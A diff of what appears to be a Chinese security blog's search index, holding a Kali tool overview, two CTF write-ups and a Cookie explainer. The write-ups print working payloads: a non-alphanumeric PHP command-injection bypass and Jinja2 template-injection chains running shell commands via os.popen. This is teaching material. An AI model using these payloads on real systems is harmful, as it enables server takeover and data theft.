@@ -154,24 +154,27 @@
     <url>/2021/07/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95kali-Linux%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<p><img src="https://image.3001.net/images/20210521/1621571329_60a73701d9767251e4748.png!small" alt="img"></p>
 <p><strong>kali Linux工具帮你评估 Web 服务器的安全性，并帮助你执行黑客渗透测试。</strong></p>
-<h3 id="注意：这里不是所提及的所有工具都是开源的。"><a href="#注意：这里不是所提及的所有工具都是开源的。" class="headerlink" title="注意：这里不是所提及的所有工具都是开源的。"></a><strong>注意：这里不是所提及的所有工具都是开源的。</strong></h3><span id="more"></span>
-
-<h2 id="1-Nmap"><a href="#1-Nmap" class="headerlink" title="1. Nmap"></a>1. Nmap</h2><p><img src="https://image.3001.net/images/20210520/1621507756_60a63eac521c0abeb99bc.png!small?1621507755558" alt="1621507756_60a63eac521c0abeb99bc.png!small?1621507755558"></p>
+<span id="more"></span>
+<h3 id="注意：这里不是所提及的所有工具都是开源的。"><strong>注意：这里不是所提及的所有工具都是开源的。</strong></h3>
+<h2 id="1-Nmap">1. Nmap</h2>
+<p><img src="https://image.3001.net/images/20210520/1621507756_60a63eac521c0abeb99bc.png!small?1621507755558" alt="1621507756_60a63eac521c0abeb99bc.png!small?1621507755558"></p>
 <p><strong>Nmap</strong>（<strong>网络映射器</strong>）是一款用于<strong>网络发现</strong>和<strong>安全审计</strong>的<strong>网络安全</strong>工具.</p>
 <p><a href="https://zh.wikipedia.org/wiki/Nmap#Nmap_%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD">核心功能</a><strong><a href="https://zh.wikipedia.org/wiki/Nmap#Nmap_%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD">:  主机发现,端口扫描,版本侦测,操作系统侦测,防火墙/IDS规避和哄骗</a></strong></p>
 <p>Nmap 基本语法</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap [ &lt;扫描类型&gt; ...] [ &lt;选项&gt; ] &#123; &lt;扫描目标说明&gt; &#125;</span><br></pre></td></tr></table></figure>
-
 <p><strong>全面进攻性</strong>扫描（包括各种主机发现、端口扫描、版本扫描、OS扫描及默认脚本扫描）:</p>
 <p>nmap -A -v target_ip</p>
 <p><strong>ping</strong>扫描:    nmap -sn -v target_ip</p>
 <p><strong>快速端口</strong>扫描:nmap -F -v target_ip</p>
 <p><strong>版本</strong>扫描:    nmap -sV -v target_ip</p>
 <p><strong>操作系统</strong>扫描:nmap -O -v target_ip</p>
-<h2 id="2-Wireshark"><a href="#2-Wireshark" class="headerlink" title="2. Wireshark"></a>2. Wireshark</h2><p><img src="https://image.3001.net/images/20210520/1621519865_60a66df98359498712be9.png!small?1621519864772" alt="1621519865_60a66df98359498712be9.png!small?1621519864772"></p>
-<h2 id><a href="#" class="headerlink" title></a></h2><p><strong>Wireshark的</strong>是一个<a href="https://en.wikipedia.org/wiki/Free_software">自由</a>和<a href="https://en.wikipedia.org/wiki/Open-source_software">开源</a><a href="https://en.wikipedia.org/wiki/Packet_analyzer">数据包分析器,是 Kali Linux 上最受欢迎的网络分析仪。</a></p>
+<h2 id="2-Wireshark">2. Wireshark</h2>
+<p><img src="https://image.3001.net/images/20210520/1621519865_60a66df98359498712be9.png!small?1621519864772" alt="1621519865_60a66df98359498712be9.png!small?1621519864772"></p>
+<h2 id></h2>
+<p><strong>Wireshark的</strong>是一个<a href="https://en.wikipedia.org/wiki/Free_software">自由</a>和<a href="https://en.wikipedia.org/wiki/Open-source_software">开源</a><a href="https://en.wikipedia.org/wiki/Packet_analyzer">数据包分析器,是 Kali Linux 上最受欢迎的网络分析仪。</a></p>
 <p><strong>Wireshark</strong>使用WinPCAP作为接口，直接与<strong>网卡</strong>进行<strong>数据报文交换。</strong></p>
-<h2 id="3-Metasploit-Framework"><a href="#3-Metasploit-Framework" class="headerlink" title="3. Metasploit Framework"></a>3. Metasploit Framework</h2><p><img src="https://image.3001.net/images/20210520/1621522244_60a67744d96353fc7a85a.png!small?1621522243943" alt="1621522244_60a67744d96353fc7a85a.png!small?1621522243943"></p>
+<h2 id="3-Metasploit-Framework">3. Metasploit Framework</h2>
+<p><img src="https://image.3001.net/images/20210520/1621522244_60a67744d96353fc7a85a.png!small?1621522243943" alt="1621522244_60a67744d96353fc7a85a.png!small?1621522243943"></p>
 <p><strong>Metasploit Framework</strong>是一个旨在提供<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3">安全漏洞信息</a>计算机安全项目，可以协助安全工程师进行<a href="https://zh.wikipedia.org/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>（penetration testing）及<a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F">入侵检测系统</a>签名开发。</p>
 <p><strong>Metasploit Framework</strong>最为知名的子项目是<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81">开源</a>的Metasploit框架，一套针对远程主机进行开发和执行“<a href="https://zh.wikipedia.org/wiki/Exploit">exploit</a>代码”的工具</p>
 <p>使用<strong>Metasploit框架</strong>的基本步骤包括：</p>
@@ -180,41 +183,50 @@
 <p>选择并配置一个<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD">有效负载</a>(payload, 在成功进入后在目标系统上执行的代码）；</p>
 <p>选择编码方式，使<a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E9%A2%84%E9%98%B2%E7%B3%BB%E7%BB%9F">入侵预防系统</a>，忽略已被编码的有效负载；</p>
 <p>执行攻击代码。</p>
-<h2 id="4-Hydra"><a href="#4-Hydra" class="headerlink" title="4.Hydra"></a>4.Hydra</h2><p><img src="https://image.3001.net/images/20210521/1621557142_60a6ff96c05efacb613fa.png!small?1621557141539" alt="1621557142_60a6ff96c05efacb613fa.png!small?1621557141539"></p>
+<h2 id="4-Hydra">4.Hydra</h2>
+<p><img src="https://image.3001.net/images/20210521/1621557142_60a6ff96c05efacb613fa.png!small?1621557141539" alt="1621557142_60a6ff96c05efacb613fa.png!small?1621557141539"></p>
 <p><strong>Hydra</strong>是<a href="https://en.wikipedia.org/wiki/Parallel_computing">并行化的</a>网络<a href="https://en.wikipedia.org/wiki/Password_cracking">登录破解程序，</a>内置于各种操作系统中。</p>
 <p><strong>Hydra</strong>通过使用<a href="https://en.wikipedia.org/wiki/Brute-force_attacks">暴力攻击</a>，猜测正确的用户名和<a href="https://en.wikipedia.org/wiki/Password">密码</a>。</p>
 <p><strong>kali</strong>下是默认安装的，几乎支持<strong>所有协议</strong>的在线破解</p>
-<h2 id="5-Aircrack-ng"><a href="#5-Aircrack-ng" class="headerlink" title="5.Aircrack-ng"></a>5.Aircrack-ng</h2><p><img src="https://image.3001.net/images/20210521/1621558601_60a705494e04e16c4a9ea.png!small?1621558601612" alt="1621558601_60a705494e04e16c4a9ea.png!small?1621558601612"></p>
-<p><strong>Aircrack-ng</strong>是一个与<a href="https://zh.wikipedia.org/wiki/802.11">802.11</a>标准的无线网络分析有关的安全软件，主要功能有：网络侦测，<a href="https://zh.wikipedia.org/wiki/%E5%97%85%E6%8E%A2">数据包嗅探</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">WEP</a>和<a href="https://zh.wikipedia.org/wiki/WPA">WPA</a>/<a href="https://zh.wikipedia.org/w/index.php?title=WPA2-PSK&action=edit&redlink=1">WPA2-PSK</a>破解。</p>
+<h2 id="5-Aircrack-ng">5.Aircrack-ng</h2>
+<p><img src="https://image.3001.net/images/20210521/1621558601_60a705494e04e16c4a9ea.png!small?1621558601612" alt="1621558601_60a705494e04e16c4a9ea.png!small?1621558601612"></p>
+<p><strong>Aircrack-ng</strong>是一个与<a href="https://zh.wikipedia.org/wiki/802.11">802.11</a>标准的无线网络分析有关的安全软件，主要功能有：网络侦测，<a href="https://zh.wikipedia.org/wiki/%E5%97%85%E6%8E%A2">数据包嗅探</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">WEP</a>和<a href="https://zh.wikipedia.org/wiki/WPA">WPA</a>/<a href="https://zh.wikipedia.org/w/index.php?title=WPA2-PSK&amp;action=edit&amp;redlink=1">WPA2-PSK</a>破解。</p>
 <p><strong>Aircrack-ng可以</strong>用于<strong>监视</strong>，<strong>收集</strong>有关WiFi的信息SSID（服务集标识符）IP和MAC地址以及WiFi的破解密码</p>
-<h2 id="6-Nessus"><a href="#6-Nessus" class="headerlink" title="6.Nessus"></a>6.Nessus</h2><p><img src="https://image.3001.net/images/20210521/1621559138_60a70762f130c4c142c9d.png!small?1621559139366" alt="1621559138_60a70762f130c4c142c9d.png!small?1621559139366"></p>
+<h2 id="6-Nessus">6.Nessus</h2>
+<p><img src="https://image.3001.net/images/20210521/1621559138_60a70762f130c4c142c9d.png!small?1621559139366" alt="1621559138_60a70762f130c4c142c9d.png!small?1621559139366"></p>
 <p><strong>Nessus</strong>为一款<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F">系统</a>弱点<a href="https://zh.wikipedia.org/wiki/%E6%89%AB%E6%8F%8F">扫描</a>与分析软件。能够协助<strong>检测和修复</strong>各种操作系统、应用程序、乃至设备上的漏洞、恶意软件、配置错误、及补丁的缺失。</p>
 <p>但是，它不再是免费的工具了，免费的功能受限制。</p>
-<h2 id="7-WafW00f"><a href="#7-WafW00f" class="headerlink" title="7.WafW00f"></a>7.WafW00f</h2><p><img src="https://image.3001.net/images/20210521/1621566853_60a72585ab7ca2a6138c3.png!small?1621566854391" alt="1621566853_60a72585ab7ca2a6138c3.png!small?1621566854391"></p>
-<p>**Wafw00f –**防火墙检测工具，</p>
+<h2 id="7-WafW00f">7.WafW00f</h2>
+<p><img src="https://image.3001.net/images/20210521/1621566853_60a72585ab7ca2a6138c3.png!small?1621566854391" alt="1621566853_60a72585ab7ca2a6138c3.png!small?1621566854391"></p>
+<p>**Wafw00f --**防火墙检测工具，</p>
 <p><strong>Wafw00f</strong> 使用一组HTTP请求和方法查询Web服务器,分析来自它们的响应并检测防火墙</p>
-<h2 id="8-Burp-Suite"><a href="#8-Burp-Suite" class="headerlink" title="8. Burp Suite"></a>8. Burp Suite</h2><p><img src="https://image.3001.net/images/20210520/1621526092_60a6864c6294e11a17405.png!small?1621526091423" alt="1621526092_60a6864c6294e11a17405.png!small?1621526091423"></p>
+<h2 id="8-Burp-Suite">8. Burp Suite</h2>
+<p><img src="https://image.3001.net/images/20210520/1621526092_60a6864c6294e11a17405.png!small?1621526091423" alt="1621526092_60a6864c6294e11a17405.png!small?1621526091423"></p>
 <p><strong>Burp Suite</strong>是一个用于测试网络应用程序安全性的图形化工具，出色的网络安全分析工具。</p>
 <p><strong>主要模块</strong>介绍:</p>
 <p><strong>HTTP代理</strong>— 它作为一个 Web 代理服务器运行，并且位于浏览器和目标 Web 服务器之间。这允许拦截、检查和修改在两个方向上通过的原始流量。</p>
 <p><strong>Scanner</strong>(扫描器)— 一个 Web 应用程序安全扫描器，用于执行 Web 应用程序的自动漏洞扫描。</p>
 <p><strong>Intruder</strong>(入侵)— 此工具可以对 Web 应用程序执行自动攻击。该工具提供了一种可配置的<a href="https://zh.wikipedia.org/wiki/%E7%AE%97%E6%B3%95">算法</a>，可以生成恶意 HTTP 请求。Intruder 工具可以测试和检测 <a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A">SQL 注入</a>、<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">跨站脚本</a>、参数篡改和易受蛮力攻击的漏洞。</p>
-<p>**Spider(蜘蛛)**— 一个自动抓取 Web 应用程序的工具。</p>
-<p>**Repeater(中继器)**— 一个可以用来手动测试应用程序的简单工具。它可以用于修改对服务器的请求，重新发送它们并观察结果。</p>
+<p><strong>Spider(蜘蛛)</strong>— 一个自动抓取 Web 应用程序的工具。</p>
+<p><strong>Repeater(中继器)</strong>— 一个可以用来手动测试应用程序的简单工具。它可以用于修改对服务器的请求，重新发送它们并观察结果。</p>
 <p><strong>Decoder</strong>(解码器)— 一种将已编码的数据转换为其规范形式，或将原始数据转换为各种编码和散列形式的工具。它能够利用启发式技术智能识别多种编码格式。</p>
 <p><strong>Comparer</strong>(比较)— 在任意两个数据项之间执行比较（一个可视化的“差异”）的工具。</p>
 <p><strong>Extender</strong>(扩展)— 允许安全测试人员加载 Burp 扩展，使用安全测试人员自己的或第三方代码扩展 Burp 的功能</p>
 <p><strong>Sequencer</strong>(会话)— 一种分析数据项样本随机性的工具。它可以用于测试应用程序的会话令牌或其他重要的数据项，如反 CSRF 令牌、密码重置令牌等。</p>
-<h2 id="9-Maltego"><a href="#9-Maltego" class="headerlink" title="9.Maltego"></a>9.Maltego</h2><p><img src="https://image.3001.net/images/20210521/1621568089_60a72a59da57f1f4697a9.png!small?1621568090170" alt="1621568089_60a72a59da57f1f4697a9.png!small?1621568090170"></p>
+<h2 id="9-Maltego">9.Maltego</h2>
+<p><img src="https://image.3001.net/images/20210521/1621568089_60a72a59da57f1f4697a9.png!small?1621568090170" alt="1621568089_60a72a59da57f1f4697a9.png!small?1621568090170"></p>
 <p><strong>Maltego</strong>–是一个<strong>开源情报</strong>（OSINT）和<strong>图形链接分析</strong>工具,用于<strong>收集和连接</strong>用于调查任务的信息。</p>
 <p><strong>Maltego  以简单,智能,功能强大受安全人员喜爱。</strong></p>
-<h2 id="10-W3AF"><a href="#10-W3AF" class="headerlink" title="10.W3AF"></a>10.W3AF</h2><p><img src="https://image.3001.net/images/20210521/1621570653_60a7345de36022a563727.png!small?1621570654103" alt="1621570653_60a7345de36022a563727.png!small?1621570654103"></p>
+<h2 id="10-W3AF">10.W3AF</h2>
+<p><img src="https://image.3001.net/images/20210521/1621570653_60a7345de36022a563727.png!small?1621570654103" alt="1621570653_60a7345de36022a563727.png!small?1621570654103"></p>
 <p><strong>W3AF</strong>是一个<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%BA%90">开源</a>的Web应用程序安全扫描器。该项目为<a href="https://zh.wikipedia.org/wiki/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">Web应用程序</a>提供了一个漏洞扫描器和漏洞利用工具。它提供了有关<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3">安全性漏洞</a>的信息，以便在<a href="https://zh.wikipedia.org/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>项目中使用</p>
 <p><strong>W3AF</strong>能用Web应用程序攻击和审核框架的Arconym，来查找网站中的缺陷</p>
-<h2 id="11-Wpscan"><a href="#11-Wpscan" class="headerlink" title="11.Wpscan"></a>11.Wpscan</h2><p><img src="https://image.3001.net/images/20210521/1621571845_60a7390565d22fd5ad546.png!small?1621571846484" alt="1621571845_60a7390565d22fd5ad546.png!small?1621571846484"></p>
+<h2 id="11-Wpscan">11.Wpscan</h2>
+<p><img src="https://image.3001.net/images/20210521/1621571845_60a7390565d22fd5ad546.png!small?1621571846484" alt="1621571845_60a7390565d22fd5ad546.png!small?1621571846484"></p>
 <p><strong>Wpscan</strong>是Kali Linux 自带的一款漏洞扫描工具，它采用Ruby 编写，能够扫描WordPress 网站中的多种安全漏洞，它可以为所有Web开发人员扫描 WordPress漏洞并在他们开发前找到并解决问题。</p>
-<p>WordPress（WP，WordPress.org）是一个<a href="https://en.wikipedia.org/wiki/Free_and_open-source_software">免费的开源</a><a href="https://en.wikipedia.org/wiki/Content_management_system">内容管理系统</a>（CMS）</p>
-<h2 id="12-sqlmap"><a href="#12-sqlmap" class="headerlink" title="12.sqlmap"></a>12.sqlmap</h2><p><img src="https://image.3001.net/images/20210521/1621573031_60a73da7e023739dc8878.png!small?1621573033546" alt="1621573031_60a73da7e023739dc8878.png!small?1621573033546"></p>
+<p>WordPress（WP，<a href="http://WordPress.org">WordPress.org</a>）是一个<a href="https://en.wikipedia.org/wiki/Free_and_open-source_software">免费的开源</a><a href="https://en.wikipedia.org/wiki/Content_management_system">内容管理系统</a>（CMS）</p>
+<h2 id="12-sqlmap">12.sqlmap</h2>
+<p><img src="https://image.3001.net/images/20210521/1621573031_60a73da7e023739dc8878.png!small?1621573033546" alt="1621573031_60a73da7e023739dc8878.png!small?1621573033546"></p>
 <p><strong>sqlmap</strong>是一个开源的渗透测试工具，可以用来进行自动化检测，能自动化利用 SQL 注入漏洞的过程，帮助你接管数据库服务器</p>
 ]]></content>
       <categories>
@@ -333,35 +345,30 @@
     <content><![CDATA[<p>访问网址显示内容如下:</p>
 <p><img src="https://image.3001.net/images/20210527/1622098597_60af42a5e19348b39f48e.png!small?1622098595141" alt="1622098597_60af42a5e19348b39f48e.png!small?1622098595141"></p>
 <span id="more"></span>
-
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>代码如下:</p>
+<h2 id="分析">分析</h2>
+<p>代码如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;code&#x27;]))&#123;                          #code参数highlight_file(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;       #绕过正则die(&#x27;fighting!&#x27;); </span><br><span class="line">    &#125;</span><br><span class="line">    system($code);                                  #输出flag&#125;主要考查PHP代码审计和绕过规则</span><br></pre></td></tr></table></figure>
-
 <p>该题和津门杯hate_php很类似</p>
-<!--more-->
-
 <p><img src="https://image.3001.net/images/20210527/1622101436_60af4dbc80464fb8d6649.png!small?1622101433438" alt="1622101436_60af4dbc80464fb8d6649.png!small?1622101433438"></p>
 <p>不同的地方就是函数<strong>eval(),system()</strong></p>
 <p><strong>eval类型函数是代码执行     system类型函数是命令执行 不需要闭合</strong></p>
 <p>绕过原理:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:?code=.%20/???/????????[@-[]</span><br></pre></td></tr></table></figure>
-
 <p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
 <p><img src="https://image.3001.net/images/20210527/1622100937_60af4bc97bd26df61ae01.png!small?1622100934463" alt="1622100937_60af4bc97bd26df61ae01.png!small?1622100934463"></p>
 <p>该题的PHP版本是<strong>5.6</strong></p>
-<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.打开本地服务器phpStudy</p>
+<h2 id="解题步骤">解题步骤</h2>
+<p>1.打开本地服务器phpStudy</p>
 <p>2.在根目录下一般是  <strong>\phpStudy\WWW</strong> 创建一个 <strong>.txt</strong>文件</p>
 <p>写一个文件上传php代码  然后改成 <strong>.html</strong>文件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://10.1.5.252:2333/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://image.3001.net/images/20210527/1622102539_60af520b70721eba5d00d.png!small?1622102536372" alt="1622102539_60af520b70721eba5d00d.png!small?1622102536372"></p>
 <p>上传一个 <strong>.txt</strong>文件写上</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
-
 <p>3.抓返回包</p>
 <p><img src="https://image.3001.net/images/20210527/1622102973_60af53bde7b5ad0275597.png!small?1622102971022" alt="1622102973_60af53bde7b5ad0275597.png!small?1622102971022"></p>
 <p>然后**cat,**得到flag</p>
-<p> <img src="https://image.3001.net/images/20210527/1622103092_60af54349b3c4f8de178a.png!small?1622103089727" alt="1622103092_60af54349b3c4f8de178a.png!small?1622103089727"></p>
+<p><img src="https://image.3001.net/images/20210527/1622103092_60af54349b3c4f8de178a.png!small?1622103089727" alt="1622103092_60af54349b3c4f8de178a.png!small?1622103089727"></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -377,19 +384,15 @@
     <url>/2021/07/05/G1CTF2021-SSTI/</url>
     <content><![CDATA[<p>访问网址显示内容如下:</p>
 <p><img src="https://image.3001.net/images/20210821/1629516790_612073f655515b896a6a8.png!small" alt="img"></p>
-<p>输入49发现回显了49</p>
-<span id="more"></span>
-
+<p>输入49发现回显了49<span id="more"></span></p>
 <p><img src="https://image.3001.net/images/20210530/1622374776_60b37978dc3104735bc4d.png!small" alt="1622374776_60b37978dc3104735bc4d.png!small"></p>
 <p><strong>模板注入 。</strong></p>
 <p>模板注入解析:  <a href="https://xz.aliyun.com/t/7746">https://xz.aliyun.com/t/7746</a></p>
 <p>这里就不多解释了直接上payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;%if%20c.__name__==&#x27;catch_warnings&#x27;%27&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://image.3001.net/images/20210530/1622376727_60b381170a65dc8580eb0.png!small" alt="1622376727_60b381170a65dc8580eb0.png!small"></p>
 <p>测试可知<strong>过滤flag</strong>,命令执行绕过得FLAG:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;%if%20c.__name__==&#x27;catch_warnings&#x27;%27&#x27;%&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /fla&#x27;&#x27;g&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -923,14 +926,13 @@
   <entry>
     <title>HTTP Cookie</title>
     <url>/2021/08/21/HTTP-Cookie/</url>
-    <content><![CDATA[<h2 id="HTTP-Cookie"><a href="#HTTP-Cookie" class="headerlink" title="HTTP Cookie"></a>HTTP Cookie</h2><blockquote>
-<p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会<strong>在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上</strong>。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p>
+    <content><![CDATA[<h2 id="HTTP-Cookie">HTTP Cookie</h2>
+<blockquote>
+<p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会<strong>在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上</strong>。<span id="more"></span>通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p>
 </blockquote>
-<span id="more"></span>
-
 <p>Cookie 主要用于以下<strong>三个方面</strong>：</p>
 <blockquote>
-<p><strong>会话状态管理（</strong>如用户登录状态、购物车、游戏分数或其它需要记录的信息）</p>
+<p>**会话状态管理（**如用户登录状态、购物车、游戏分数或其它需要记录的信息）</p>
 <p><strong>个性化设置</strong>（如用户自定义设置、主题等）</p>
 <p><strong>浏览器行为跟踪</strong>（如跟踪分析用户行为等）</p>
 </blockquote>
@@ -938,22 +940,22 @@
 <p>Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用<strong>Web storage API</strong>（本地存储和会话存储）或<strong>IndexedDB</strong>。</p>
 </blockquote>
 <p><strong>注：要查看Cookie存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用存储查看（<a href="https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector">Storage Inspector</a>）功能，并在存储树上选中Cookie。</strong></p>
-<h2 id="创建Cookie"><a href="#创建Cookie" class="headerlink" title="创建Cookie"></a>创建Cookie</h2><blockquote>
-<p><strong>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie</strong><strong>(响应首部,被用来由服务器端向客户端发送 cookie)选项</strong>。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 <code>**Cookie(**请求首部,)</code>请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
+<h2 id="创建Cookie">创建Cookie</h2>
+<blockquote>
+<p><strong>当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie</strong>**(响应首部,被用来由服务器端向客户端发送 cookie)选项**。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 <code>**Cookie(**请求首部,)</code>请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
 </blockquote>
-<h3 id="Set-Cookie响应头部和Cookie请求头部"><a href="#Set-Cookie响应头部和Cookie请求头部" class="headerlink" title="Set-Cookie响应头部和Cookie请求头部"></a>Set-Cookie响应头部和Cookie请求头部</h3><blockquote>
+<h3 id="Set-Cookie响应头部和Cookie请求头部">Set-Cookie响应头部和Cookie请求头部</h3>
+<blockquote>
 <p>服务器使用<strong>Set-Cookie</strong>响应头部向用户代理（一般是浏览器）发送 <strong>Cookie</strong> 信息。</p>
 </blockquote>
 <p>一个简单的 Cookie 可能像这样：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt;</span><br></pre></td></tr></table></figure>
-
 <p>服务器通过该头部告知客户端保存 Cookie 信息。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: yummy_cookie=choco</span><br><span class="line">Set-Cookie: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[页面内容]</span><br></pre></td></tr></table></figure>
-
 <p>现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过 Cookie 请求头部再发送给服务器。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>
-
-<h2 id="定义-Cookie-的生命周期"><a href="#定义-Cookie-的生命周期" class="headerlink" title="定义 Cookie 的生命周期"></a>定义 Cookie 的生命周期</h2><p>Cookie 的生命周期可以通过<strong>两种方式定义</strong>：</p>
+<h2 id="定义-Cookie-的生命周期">定义 Cookie 的生命周期</h2>
+<p>Cookie 的生命周期可以通过<strong>两种方式定义</strong>：</p>
 <blockquote>
 <p>1.会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（Expires<code>）或者有效期（Max-Age``）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。</code></p>
 <p>2.持久性 Cookie 的生命周期取决于过期时间(Expires<code>)或者有效期(Max-Age)</code>指定的一段时间。</p>
@@ -961,16 +963,15 @@
 <p>``</p>
 <p>例如：</p>
